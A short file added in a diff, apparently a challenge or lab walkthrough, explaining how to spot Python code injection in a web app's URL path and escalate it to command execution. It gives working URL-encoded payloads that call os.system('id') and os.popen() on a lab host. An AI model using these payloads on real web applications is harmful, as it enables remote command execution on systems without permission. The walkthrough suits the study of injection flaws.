@@ -1,0 +1,20 @@
+Author: Pawel Werner
+e-mail: pawel.k.werner@gmail.com
+linkedin: https://www.linkedin.com/in/pawe%C5%82-werner-31b40a53/
+
+*************** PYTHON ***************
+
+1.To check if it's a Python application, we can for example use (adding to URL):
+- "%2bstr(True)%2b"test. [e.g.: http://yourwebsite/hello/"%2bstr(True)%2b"test) ]
+
+The fact that both str() and True are available give us a pretty good chance that Python is used. For the rest of the challenge we will put our payload inside of the call to str().
+
+2. Now, to get to code execution, we can try to use os.system('id') for example:
+
+- http://ptl-0965dda5-eea846ab.libcurl.so/hello/%22%2bstr(os.system('id'))%2b%22
+
+If the return is "0", we know that the command got executed successfully. (if now, you will get 32512 which means that command doesn't exist).
+
+3. It may also be valuable to get the value returned by the command. To do this, you can use os.popen:
+
+http://yourwebsite.com/hello/%22%2bstr(os.popen('/usr/local/bin/').read())%2b%22
